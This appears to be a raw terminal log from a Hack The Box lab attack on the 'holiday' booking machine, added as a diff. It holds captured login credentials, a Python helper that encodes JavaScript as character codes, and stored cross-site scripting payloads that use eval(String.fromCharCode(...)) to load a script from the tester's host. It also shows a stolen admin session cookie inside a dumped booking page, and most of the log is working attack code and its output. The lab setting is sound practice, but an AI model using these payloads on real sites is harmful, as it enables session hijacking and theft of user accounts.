@@ -1,0 +1,422 @@
+root@parrot:~/hackthebox/holiday# vi login_creds                                                                                                                 
+root@parrot:~/hackthebox/holiday# cat login                                     
+cat: login: No such file or directory   
+root@parrot:~/hackthebox/holiday# cat login_creds                               
+username : RickA                        
+password : fdc8cd4cff2c19e0d1022e78481ddf36                                     
+root@parrot:~/hackthebox/holiday# wc -c login_creds                             
+61 login_creds                          
+root@parrot:~/hackthebox/holiday# echo fdc8cd4cff2c19e0d1022e78481ddf36 | wc -c 
+33                                      
+root@parrot:~/hackthebox/holiday# vi login_creds                                
+root@parrot:~/hackthebox/holiday# ipython                                       
+Python 2.7.17 (default, Oct 19 2019, 23:36:22)                                  
+Type "copyright", "credits" or "license" for more information.                  
+
+IPython 5.8.0 -- An enhanced Interactive Python.                                
+?         -> Introduction and overview of IPython's features.                   
+%quickref -> Quick reference.           
+help      -> Python's own help system.  
+object?   -> Details about 'object', use 'object??' for extra details.          
+
+In [1]: def CreateEncodeJS(ascii):      
+   ...:     decimalString = "           
+  File "<ipython-input-1-907955df764d>", line 2                                 
+    decimalString = "                   
+                     ^                  
+SyntaxError: EOL while scanning string literal                                  
+
+
+In [2]: def CreateEncodeJS(ascii):      
+   ...:     decimalString = " "         
+   ...:     for char in ascii:          
+   ...:         print ord(char)         
+   ...:                                 
+
+In [3]: print CreateEncodeJS('abc')     
+97                                      
+98                                      
+99                                      
+None                                    
+
+In [4]: def CreateEncodeJS(ascii):      
+   ...:     decimalString = " "         
+   ...:     for char in ascii:          
+   ...:         decimal_String += str(ord(char))                                
+   ...:     return decimal_String       
+   ...:                                 
+   ...:                                 
+
+In [5]: CreateEncodeJS("abc")           
+---------------------------------------------------------------------------     
+UnboundLocalError                         Traceback (most recent call last)     
+<ipython-input-5-20b61e442e0d> in <module>()                                    
+----> 1 CreateEncodeJS("abc")           
+
+<ipython-input-4-3dc2f2e2c48b> in CreateEncodeJS(ascii)                         
+      2     decimalString = " "         
+      3     for char in ascii:          
+----> 4         decimal_String += str(ord(char))                                
+      5     return decimal_String       
+      6                                 
+
+UnboundLocalError: local variable 'decimal_String' referenced before assignment 
+
+In [6]: print CreateEncodeJS("abc")     
+---------------------------------------------------------------------------     
+UnboundLocalError                         Traceback (most recent call last)     
+<ipython-input-6-e09df21154d2> in <module>()                                    
+----> 1 print CreateEncodeJS("abc")     
+
+<ipython-input-4-3dc2f2e2c48b> in CreateEncodeJS(ascii)                         
+      2     decimalString = " "         
+      3     for char in ascii:          
+----> 4         decimal_String += str(ord(char))                                
+      5     return decimal_String       
+      6                                 
+
+UnboundLocalError: local variable 'decimal_String' referenced before assignment 
+
+In [7]: def CreateEncodeJS(ascii):      
+   ...:     decimalString = " "         
+   ...:     for char in ascii:          
+   ...:         decimalString += str(ord(char))                                 
+   ...:     return decimalString        
+   ...:                                 
+
+In [8]: print CreateEncodeJS('abc')     
+ 979899                                 
+
+In [9]: def CreateEncodeJS(ascii):      
+   ...:     decimalString = " "         
+   ...:     for char in ascii:          
+   ...:         decimalString += str(ord(char)) + ","                           
+   ...:     return decimalString[:-1]   
+   ...:                                 
+
+In [10]: print CreateEncodeJS('abc')    
+ 97,98,99                               
+
+In [11]: exit                           
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday# ipython                                       
+Python 2.7.17 (default, Oct 19 2019, 23:36:22)                                  
+Type "copyright", "credits" or "license" for more information.                  
+
+IPython 5.8.0 -- An enhanced Interactive Python.                                
+?         -> Introduction and overview of IPython's features.                   
+%quickref -> Quick reference.           
+help      -> Python's own help system.  
+object?   -> Details about 'object', use 'object??' for extra details.          
+
+In [1]: def CreateEncodeJS(ascii):      
+   ...:     decimalString = " "         
+   ...:     for char in ascii:          
+   ...:         decimalString += str(ord(char)) + ","                           
+   ...:     return decimalString[:-1]   
+   ...:                                 
+
+In [2]: print(CreateEncodeJS("""document.write('<script src="http://10.10.14.14/holiday.js"></script>');""")                                                     
+   ...: )                               
+ 100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59                                                                      
+
+In [3]: print(CreateEncodeJS("""document.write('<script src="http://10.10.14.14:8000/holiday.js"></script>');"""))                                               
+ 100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59                                                       
+
+In [4]: print(CreateEncodeJS("""document.write('<script src="http://10.10.14.14/holiday.js"></script>');"""))                                                    
+ 100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59                                                                      
+
+In [5]: import urllib                   
+
+In [6]: 0%20%3Cinput%20type%3D%22hidden%22%20name%3D%22cookie%22%20value%3D%22connect.sid%26%23x3D%3Bs%253A94586010-386a-11ea-a7b0-0fc7ba4d9c73.3vt4UJZtNbLeWVAGh
+   ...: EpJbGJIYA%252B8htQ3V2HzfLZRpmY%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %3Cinput%20type%3D%22hidden%22%20name%3D%22id%22%20value%3D%2214%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2
+   ...: 0%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22button%22%20type%3D%22submit%22%3EApprove%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%
+   ...: 20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Chr%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+   ...: 20%20%20%20cookie%3D%253C!DOCTYPE%2520html%253E%250A%253Chtml%2520lang%253D%2522en%2522%253E%250A%2520%2520%253Chead%253E%250A%2520%2520%2520%2520%2520%2
+   ...: 520%253Cmeta%2520charset%253D%2522utf-8%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Cmeta%0D%0A%2520http-equiv%253D%2522X-UA-Compatible%2522%2520cont
+   ...: ent%253D%2522IE%253Dedge%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Ctitle%253EBooking%2520Management%253C%252Ftitle%253E%250A%2520%2520%2520%2520%2
+   ...: 520%2520%253Cmet%0D%0Aa%2520name%253D%2522viewport%2522%2520content%253D%2522width%253Ddevice-width%252C%2520minimum-scale%253D1.0%252C%2520maximum-scale
+   ...: %253D1.0%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Clink%2520rel%253D%2522styl%0D%0Aesheet%2522%2520type%253D%2522text%252Fcss%2522%2520href%253D%2
+   ...: 522%252Fcss%252Fbootstrap.min.css%2522%2520%252F%253E%250A%2520%2520%2520%2520%2520%2520%253Clink%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text
+   ...: %252Fcs%0D%0As%2522%2520href%253D%2522%252Fcss%252Fmain.min.css%2522%2520%252F%253E%250A%2520%2520%2520%2520%2520%2520%253Cscript%2520src%253D%2522%252Fj
+   ...: s%252Fjquery.min.js%2522%253E%253C%252Fscript%253E%250A%2520%2520%2520%2520%2520%2520%253Cscr%0D%0Aipt%2520src%253D%2522%252Fjs%252Fbootstrap.min.js%2522
+   ...: %253E%253C%252Fscript%253E%250A%2520%2520%253C%252Fhead%253E%250A%250A%2520%2520%253Cbody%253E%250A%2520%2520%2520%2520%2520%2520%253Cdiv%2520id%253D%252
+   ...: 2st-container%2522%2520c%0D%0Alass%253D%2522st-container%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Cdiv%2520class%253D%2522st-content%2522%253E%250
+   ...: A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Cp%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%0D%0A%2520%2520%2520%253Cnav%2
+   ...: 520class%253D%2522navbar%2520navbar-inverse%2520navbar-static-top%2520hidden-print%2522%2520role%253D%2522navigation%2522%253E%250A%2520%2520%2520%2520%2
+   ...: 520%2520%2520%2520%2520%2520%2520%2520%2520%0D%0A%2520%2520%2520%2520%2520%253Cdiv%2520class%253D%2522container%2522%253E%250A%2520%2520%2520%2520%2520%2
+   ...: 520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Ca%2520class%253D%2522navbar-brand%2520navbar-hx%0D%0A-logo%2522%2
+   ...: 520href%253D%2522http%253A%252F%252Fholiday.htb%2522%2520data-hxtrack-name%253D%2522navbar-logo%2522%253EBooking%2520Management%253C%252Fa%253E%250A%2520
+   ...: %2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%25%0D%0A20%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Cul%2520class%253D%2522nav%2520navbar-
+   ...: nav%2520navbar-right%2520pull-right%2522%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%0D
+   ...: %0A%2520%2520%2520%2520%2520%2520%253Cli%2520class%253D%2522dropdown%2522%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520
+   ...: %2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Ca%2520href%253D%2522%0D%0A%2523%2522%2520class%253D%2522dropdown-tog
+   ...: gle%2520text-right%2522%2520data-hxtrack-name%253D%2522navbar-phone-numbers%2522%2520data-toggle%253D%2522dropdown%2522%253E%253Cspan%2520class%253D%2522
+   ...: hidden%0D%0A-xs%2522%253E%253Ci%2520class%253D%2522fa%2520fa-phone%2522%253E%253C%252Fi%253E%2520Freephone%25200800%2520111%25204645%253C%252Fspan%253E%2
+   ...: 53Cspan%2520class%253D%2522visible-xs%2522%253EContact%2520us%253C%252Fspan%25%0D%0A3E%253C%252Fa%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%
+   ...: 2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Cdiv%2520class%253D%2522dropdown-menu%2520nav
+   ...: bar-phone-numbers%0D%0A%2520text-right%2522%253%3Cbr%2F%3E%3Cbr%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%20%3Csmall%3EThursday%2C%20January%2016th%202020%2C%202%3A14%3A38%20pm%3C%2Fsmall%3E%3Cbr%2F%3E%0A%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action%3D%22%2Fadmin%2Fapprove%22%20method%3D%22POST%22%3E%0A%20%
+   ...: 20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22
+   ...: cookie%22%20value%3D%22connect.sid%26%23x3D%3Bs%253A94586010-386a-11ea-a7b0-0fc7ba4d9c73.3vt4UJZtNbLeWVAGhEpJbGJIYA%252B8htQ3V2HzfLZRpmY%22%3E%0A%20%20%2
+   ...: 0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22id%2
+   ...: 2%20value%3D%2215%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20c
+   ...: lass%3D%22button%22%20type%3D%22submit%22%3EApprove%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%2
+   ...: 0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3
+   ...: C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%0A%0A%20%20%2
+   ...: 0%20%20%20%20%20%20%20%3C%2Fmain%3E%0A%0A%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%3C%2Fdiv%3E%0A%0A%0A%20%20%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A""")          
+In [6]: 0%20%3Cinput%20type%3D%22hidden%22%20name%3D%22cookie%22%20value%3D%22connect.sid%26%23x3D%3Bs%253A94586010-386a-11ea-a7b0-0fc7ba4d9c73.3vt4UJZtNbLeWVAGh
+   ...: EpJbGJIYA%252B8htQ3V2HzfLZRpmY%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %3Cinput%20type%3D%22hidden%22%20name%3D%22id%22%20value%3D%2214%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2
+   ...: 0%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22button%22%20type%3D%22submit%22%3EApprove%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%
+   ...: 20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Chr%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+   ...: 20%20%20%20cookie%3D%253C!DOCTYPE%2520html%253E%250A%253Chtml%2520lang%253D%2522en%2522%253E%250A%2520%2520%253Chead%253E%250A%2520%2520%2520%2520%2520%2
+   ...: 520%253Cmeta%2520charset%253D%2522utf-8%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Cmeta%0D%0A%2520http-equiv%253D%2522X-UA-Compatible%2522%2520cont
+   ...: ent%253D%2522IE%253Dedge%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Ctitle%253EBooking%2520Management%253C%252Ftitle%253E%250A%2520%2520%2520%2520%2
+   ...: 520%2520%253Cmet%0D%0Aa%2520name%253D%2522viewport%2522%2520content%253D%2522width%253Ddevice-width%252C%2520minimum-scale%253D1.0%252C%2520maximum-scale
+   ...: %253D1.0%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Clink%2520rel%253D%2522styl%0D%0Aesheet%2522%2520type%253D%2522text%252Fcss%2522%2520href%253D%2
+   ...: 522%252Fcss%252Fbootstrap.min.css%2522%2520%252F%253E%250A%2520%2520%2520%2520%2520%2520%253Clink%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text
+   ...: %252Fcs%0D%0As%2522%2520href%253D%2522%252Fcss%252Fmain.min.css%2522%2520%252F%253E%250A%2520%2520%2520%2520%2520%2520%253Cscript%2520src%253D%2522%252Fj
+   ...: s%252Fjquery.min.js%2522%253E%253C%252Fscript%253E%250A%2520%2520%2520%2520%2520%2520%253Cscr%0D%0Aipt%2520src%253D%2522%252Fjs%252Fbootstrap.min.js%2522
+   ...: %253E%253C%252Fscript%253E%250A%2520%2520%253C%252Fhead%253E%250A%250A%2520%2520%253Cbody%253E%250A%2520%2520%2520%2520%2520%2520%253Cdiv%2520id%253D%252
+   ...: 2st-container%2522%2520c%0D%0Alass%253D%2522st-container%2522%253E%250A%2520%2520%2520%2520%2520%2520%253Cdiv%2520class%253D%2522st-content%2522%253E%250
+   ...: A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Cp%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%0D%0A%2520%2520%2520%253Cnav%2
+   ...: 520class%253D%2522navbar%2520navbar-inverse%2520navbar-static-top%2520hidden-print%2522%2520role%253D%2522navigation%2522%253E%250A%2520%2520%2520%2520%2
+   ...: 520%2520%2520%2520%2520%2520%2520%2520%2520%0D%0A%2520%2520%2520%2520%2520%253Cdiv%2520class%253D%2522container%2522%253E%250A%2520%2520%2520%2520%2520%2
+   ...: 520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Ca%2520class%253D%2522navbar-brand%2520navbar-hx%0D%0A-logo%2522%2
+   ...: 520href%253D%2522http%253A%252F%252Fholiday.htb%2522%2520data-hxtrack-name%253D%2522navbar-logo%2522%253EBooking%2520Management%253C%252Fa%253E%250A%2520
+   ...: %2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%25%0D%0A20%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Cul%2520class%253D%2522nav%2520navbar-
+   ...: nav%2520navbar-right%2520pull-right%2522%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%0D
+   ...: %0A%2520%2520%2520%2520%2520%2520%253Cli%2520class%253D%2522dropdown%2522%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520
+   ...: %2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Ca%2520href%253D%2522%0D%0A%2523%2522%2520class%253D%2522dropdown-tog
+   ...: gle%2520text-right%2522%2520data-hxtrack-name%253D%2522navbar-phone-numbers%2522%2520data-toggle%253D%2522dropdown%2522%253E%253Cspan%2520class%253D%2522
+   ...: hidden%0D%0A-xs%2522%253E%253Ci%2520class%253D%2522fa%2520fa-phone%2522%253E%253C%252Fi%253E%2520Freephone%25200800%2520111%25204645%253C%252Fspan%253E%2
+   ...: 53Cspan%2520class%253D%2522visible-xs%2522%253EContact%2520us%253C%252Fspan%25%0D%0A3E%253C%252Fa%253E%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%
+   ...: 2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%253Cdiv%2520class%253D%2522dropdown-menu%2520nav
+   ...: bar-phone-numbers%0D%0A%2520text-right%2522%253%3Cbr%2F%3E%3Cbr%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%20%3Csmall%3EThursday%2C%20January%2016th%202020%2C%202%3A14%3A38%20pm%3C%2Fsmall%3E%3Cbr%2F%3E%0A%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action%3D%22%2Fadmin%2Fapprove%22%20method%3D%22POST%22%3E%0A%20%
+   ...: 20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22
+   ...: cookie%22%20value%3D%22connect.sid%26%23x3D%3Bs%253A94586010-386a-11ea-a7b0-0fc7ba4d9c73.3vt4UJZtNbLeWVAGhEpJbGJIYA%252B8htQ3V2HzfLZRpmY%22%3E%0A%20%20%2
+   ...: 0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22id%2
+   ...: 2%20value%3D%2215%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20c
+   ...: lass%3D%22button%22%20type%3D%22submit%22%3EApprove%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
+   ...: %20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%2
+   ...: 0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3
+   ...: C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%0A%0A%20%20%2
+   ...: 0%20%20%20%20%20%20%20%3C%2Fmain%3E%0A%0A%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%3C%2Fdiv%3E%0A%0A%0A%20%20%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A""")          
+cookie=<!DOCTYPE html>                  
+<html lang="en">                        
+  <head>                                
+      <meta charset="utf-8">            
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">                     
+      <title>Booking Management</title> 
+      <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">                                                                  
+      <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css" />   
+      <link rel="stylesheet" type="text/css" href="/css/main.min.css" />        
+      <script src="/js/jquery.min.js"></script>                                 
+      <script src="/js/bootstrap.min.js"></script>                              
+  </head>                               
+
+  <body>                                
+      <div id="st-container" class="st-container">                              
+      <div class="st-content">          
+          <p>                           
+              <nav class="navbar navbar-inverse navbar-static-top hidden-print" role="navigation">                                                               
+                  <div class="container">                                       
+                      <a class="navbar-brand navbar-hx-logo" href="http://holiday.htb" data-hxtrack-name="navbar-logo">Booking Management</a>                    
+                      <ul class="nav navbar-nav navbar-right pull-right">       
+                          <li class="dropdown">                                 
+                              <a href="#" class="dropdown-toggle text-right" data-hxtrack-name="navbar-phone-numbers" data-toggle="dropdown"><span class="hidden-xs"><i class="fa fa-phone"></i> Freephone 0800 111 4645</span><span class="visible-xs">Contact us</span></a>                                                     
+                              <div class="dropdown-menu navbar-phone-numbers text-right">                                                                        
+                                  <div class="panel panel-default">             
+                                      <div class="panel-heading">               
+                                          Call <span class="freeNumber">0800 111 4645</span>                                                                     
+                                      </div>                                    
+                                      <div class="panel-body">                  
+                                          <p><strong>Mobiles call</strong><br>020 7930 9000</p>                                                                  
+                                          <p><strong>Monday to Friday</strong><br>08.00 to 23.00</p>                                                             
+                                          <p><strong>Weekends</strong><br>08.30 to 20.00</p>                                                                     
+                                      </div>                                    
+                                  </div>                                        
+                              </div>    
+                          </li>         
+                      </ul>             
+                  </div>                
+              </nav>                    
+          </p>                          
+          <main>                        
+              <div class="container">   
+                  <h1>Booking details</h1>                                      
+                  <!-- Nav tabs -->     
+                  <ul class="nav nav-tabs hidden-print" role="tablist">         
+                      <li class="active"><a href="#view" aria-controls="view" role="tab" data-toggle="tab"><i class="hidden-xs fa fa-eye fa-fw"></i> View</a></li>                                       
+                        <li><a href="#notes" aria-controls="notes" role="tab" data-toggle="tab"><i class="hidden-xs fa fa-sticky-note-o fa-fw"></i> Notes</a></li>                                       
+                        <li><a href="#admin" aria-controls="admin" role="tab" data-toggle="tab"><i class="hidden-xs fa fa-lock fa-fw"></i> Admin</a></li>        
+                  </ul>                 
+                  <!-- Tab panes -->    
+                  <div class="tab-content">                                     
+                      <!-- Template --> 
+                      <div role="tabpanel" class="tab-pane active" id="view">   
+                          <div class="panel panel-default">                     
+                              <div class="panel-body">                          
+                                  <form class="form-horizontal">                
+                                      <div class="form-group">                  
+                                          <label class="col-sm-4 control-label">Lead passenger</label>                                                           
+                                          <div class="col-sm-4">                
+                                              <p class="form-control-static">Orland Wilkinson</p>                                                                
+                                          </div>                                
+                                      </div>                                    
+                                      <div class="form-group">                  
+                                          <label class="col-sm-4 control-label">Booking Ref</label>                                                              
+                                          <div class="col-sm-8">                
+                                              <p class="form-control-static">12ZL1</p>                                                                           
+                                          </div>                                
+                                      </div>                                    
+                                      <div class="form-group">                  
+                                          <label class="col-sm-4 control-label">Email</label>                                                                    
+                                          <div class="col-sm-8">                
+                                              <p class="form-control-static">Aliza91@yahoo.com</p>                                                               
+                                          </div>                                
+                                      </div>                                    
+                                      <div class="form-group">                  
+                                          <label class="col-sm-4 control-label">Total Paid</label>                                                               
+                                          <div class="col-sm-8">                
+                                              <p class="form-control-static">£53</p>                                                                             
+                                          </div>                                
+                                      </div>                                    
+                                      <div class="form-group">                  
+                                          <label class="col-sm-4 control-label">From</label>                                                                     
+                                          <div class="col-sm-8">                
+                                              <p class="form-control-static">Sunday, April 1st 2018, 2:48:20 am</p>                                              
+                                          </div>                                
+                                      </div>                                    
+                                      <div class="form-group">                  
+                                          <label class="col-sm-4 control-label">to</label>                                                                       
+                                          <div class="col-sm-8">                
+                                              <p class="form-control-static">Friday, May 4th 2018, 2:35:15 am</p>                                                
+                                          </div>                                
+                                      </div>                                    
+                                      <div class="form-group">                  
+                                          <label class="col-sm-4 control-label">Flying from</label>                                                              
+                                          <div class="col-sm-8">                
+                                              <p class="form-control-static">Gutkowskiberg</p>                                                                   
+                                          </div>                                
+                                      </div>                                    
+                                  </form>                                       
+                              </div>    
+                          </div>        
+                      </div>            
+                        <div role="tabpanel" class="tab-pane" id="notes">       
+                          <div class="panel panel-default">                     
+                            <div class="panel-body">                            
+                                <h2>Notes</h2>                                  
+                                    <hr/>                                       
+                                    &amp;lt;img src&#x3D;&quot;x/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))&amp;lt;/script&amp;gt;<br/><br/>                                                                             
+                                    <small>Thursday, January 16th 2020, 1:18:01 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &amp;lt;img src&#x3D;&quot;x/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&amp;lt;/script&amp;gt;<br/><br/>                                                                            
+                                    <small>Thursday, January 16th 2020, 1:22:32 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &amp;lt;img src&#x3D;&quot;x/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&amp;lt;/script&amp;gt;<br/><br/>                                                             
+                                    <small>Thursday, January 16th 2020, 1:30:20 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 1:37:50 pm</small><br/>                                                                  
+                                    <hr/>                                       
+                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;&gt;<br/><br/>      
+                                    <small>Thursday, January 16th 2020, 1:38:07 pm</small><br/>                                                                  
+                                    <hr/>                                       
